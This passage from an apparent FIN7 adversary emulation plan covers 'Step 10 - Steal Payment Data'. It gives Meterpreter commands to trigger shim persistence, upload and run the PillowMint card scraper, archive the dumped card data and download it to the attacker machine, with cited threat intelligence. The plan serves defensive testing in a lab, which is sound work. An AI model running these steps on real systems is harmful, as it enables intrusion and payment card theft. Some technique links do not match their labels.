* The Carbanak malware is capable of performing network tunneling. <sup>[21](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)</sup>

* FIN7 has utilized terminal services such as Remote Desktop Protocol (RDP) to move laterally within environments. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf)</sup>

* FIN7 has leveraged an application shim database registered using the sdbinst.exe utility to achieve persistence on systems in multiple environments. To install and register the malicious shim database, FIN7 has used custom Base64 encoded PowerShell scripts. <sup>[24](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html)</sup>

---

## Step 10 - Steal Payment Data (Evaluations Step 20)

Step 10 focuses on stealing payment data from AccountingIQ.exe. AccountingIQ.exe is a fake payment application meant to mimic credit card data processing. The 
emulation procedure begins with the machine being rebooted, which in turn queries 
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB`  which loads the previously placed `dll329.dll` ([T1546.011](https://attack.mitre.org/techniques/T1546/011)).

`AccountingIQ.exe` then injects into SyncHost.exe ([T1071](https://attack.mitre.org/techniques/T1071/001). 
The executable `rundll32.exe` then communicates back to the C2 host via HTTPS over port 53 ([T1071.001](https://attack.mitre.org/techniques/T1071/001), 
[T1573](https://attack.mitre.org/techniques/T1573/002)). The executable `debug.exe` is then downloaded from the C2 server ([T1105](https://attack.mitre.org/techniques/T1105/)) and performs process discovery tasks ([T1057](https://attack.mitre.org/techniques/T1105/)).

`rundll32.exe` then downloads 7za.exe from the C2 server and zips up the previously dumped payment data.

### Procedures

#### 10.A - Execute Shim Persistence ([T1138](https://attack.mitre.org/techniques/T1138))

On `accounting`:

1. Reboot the host from the administrative PowerShell session
    ```
    powershell > restart-computer
    ```

On your `Ubuntu` machine:

1. RDP back into `accounting` via the previously created TCP port 3389 tunnel
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:192.168.0.4
    ```
 
You should receive a new Meterpreter session on the `Linux Attack Platform`.

#### 10.B - Obtain Credit Card Data ([T1055](https://attack.mitre.org/techniques/T1105), [T1071.001](https://attack.mitre.org/techniques/T1071/001), [T1573](https://attack.mitre.org/techniques/T1573/002))

On the `Linux Attack Platform`:

1. Interact with the new Meterpreter session obtained on `accounting`
    ```
    msf > sessions -i 4
    ```

2. Upload the PillowMint credit card scraper as `debug.exe`
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step10/pillowMint.exe C:\\Users\\Public\\debug.exe
    ```

3. Switch to the `C:\Users\Public` directory
    ```
    meterpreter > cd C:\\Users\\Public 
    ```

4. Execute PillowMint
    ```
    meterpreter > execute -f debug.exe -H -i
    ```

5. Upload file archiving utility `7za.exe`
    ```
    meterpreter > upload /home/<attacker>/fin7/Resources/Step10/7za.exe C:\\Users\\Public\\7za.exe
    ```

6. Execute archiving utility to archive credit card data
    ```
    meterpreter > execute -f 7za.exe -H -i -a "a log log.txt"
    ```

7. Exfiltrate the previously dumped credit card data
    ```
    meterpreter > download C:\\Users\\Public\\log.7z /tmp/log.7z
    ```
   
    FIN7 operations end here.

8. Background the current Meterpreter session
    ```
    meterpreter > background
    ```
   
9. Kill all Meterpreter sessions
    ```
    msf > sessions -K
    ```
   
10. Kill all Metasploit handlers
    ```
    msf > jobs -K
    ```
    
11. Exit Metasploit
    ```
    msf > exit
    ```

### Cited Intelligence
* FIN7 has utilized application shimming to execute a payload stored within the registry. <sup>[24](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html)</sup>

* Pillowmint has been used to scrape payment card data from memory. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf)</sup>

* FIN7 has targeted specific processes related to POS systems, read memory from the processes, and written them to disk for later collection. <sup>[19](https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/)</sup>

---

## Acknowledgements

---

- [Intelligence Summary](/fin7/Intelligence_Summary.md)
- [Operations Flow](/fin7/Operations_Flow.md)
- [Emulation Plan](/fin7/Emulation_Plan)
  - [Scenario 1 - Infrastructure](/fin7/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1 - Detections](/fin7/Emulation_Plan/Scenario_1)
  - [Scenario 2 - Infrastructure](/fin7/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2 - Protections](/fin7/Emulation_Plan/Scenario_2)
  - [YAML](/fin7/Emulation_Plan/yaml)
- [File Hashes](/fin7/hashes)
- [YARA Rules](/fin7/yara-rules)
- [Issues](/issues)
- [Change Log](/fin7/CHANGE_LOG.md)
